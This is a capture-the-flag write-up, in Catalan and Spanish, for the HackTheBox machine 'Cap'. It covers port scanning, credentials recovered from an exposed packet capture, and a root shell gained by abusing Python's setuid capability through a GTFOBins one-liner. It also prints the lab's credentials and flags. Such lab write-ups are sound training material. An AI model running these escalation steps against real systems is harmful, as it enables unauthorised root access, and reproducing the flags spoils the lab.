# Cap

## Cap

Plataforma: HackTheBox OS: Linux Level: Easy Status: Done Complete: Yes Created time: 2 de diciembre de 2024 13:28 IP: 10.10.10.245

## Reconocimiento

NMap all ports:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.245 -oG allports

```

> Resultats:
>
> <img src="../../.gitbook/assets/image (1).png" alt="image.png" data-size="original">

Veiem que canviant el valor del data a 0 mostra un fitxer pcap S'obre amb Wireshark i mostra credencials de FTP

![image.png](<../../.gitbook/assets/image 1 (1).png>)

User: nathan password: Buck3tH4TF0RM3!

## Análisis de vulnerabilidades

Entrem per ftp i obtenim el flag de user:

![image.png](<../../.gitbook/assets/image 2 (1).png>)

Entrem per ssh amb les mateixes credencials:

![image.png](<../../.gitbook/assets/image 3 (1).png>)

## Explotación de vulnerabilidades

busquem les capabiliies per escala privilegis

```bash
getcap -r / 2>/dev/null

```

ens troba:

![image.png](<../../.gitbook/assets/image 4 (1).png>)

Veiem qu el path /usr/bin/python3.8 te les capabilities habilitades

## Escalada de privilegios

Busquem a gtfobins com explotar el binari:

```bash
 ./usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'

```

![image.png](<../../.gitbook/assets/image 5 (1).png>)

## Bandera(s)

> User: Buck3tH4TF0RM3 Root: 8c709aec8f05bee68669d9ec4e914451
